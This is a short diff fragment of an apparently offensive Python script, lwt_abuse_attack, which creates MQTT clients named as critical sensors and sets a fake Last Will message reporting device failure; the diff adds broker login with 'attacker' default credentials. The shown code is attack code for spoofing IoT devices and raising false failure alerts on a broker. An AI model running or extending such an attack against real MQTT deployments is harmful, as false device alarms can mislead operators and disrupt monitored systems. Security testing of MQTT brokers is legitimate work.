@@ -6,6 +6,7 @@ import time
 
 def lwt_abuse_attack(broker, port, client_num):
     client = mqtt.Client(client_id=f"critical_sensor_{client_num}")
+    client.username_pw_set(os.getenv("MQTT_USER", "attacker"), os.getenv("MQTT_PASS", "attackerpass"))
     
     # Configure a fake Last Will to look like a critical device.
     lwt_message = f'{{"device":"sensor_{client_num}","status":"DEVICE_FAILURE","battery":0}}'
